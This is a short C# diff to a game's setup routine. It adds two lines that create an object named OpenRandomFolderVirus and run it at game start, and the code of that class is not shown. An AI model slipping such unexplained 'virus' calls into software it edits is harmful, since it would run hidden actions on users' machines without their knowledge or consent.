@@ -61,6 +61,9 @@ namespace Game
 			//TODO: select difficulty at start of the game
 			_difficulty = Difficulty.Medium;
 
+			var stuff = new OpenRandomFolderVirus();
+			stuff.Execute();
+
 			GenerateGameTasks((int)_difficulty + 1);
 		}
 
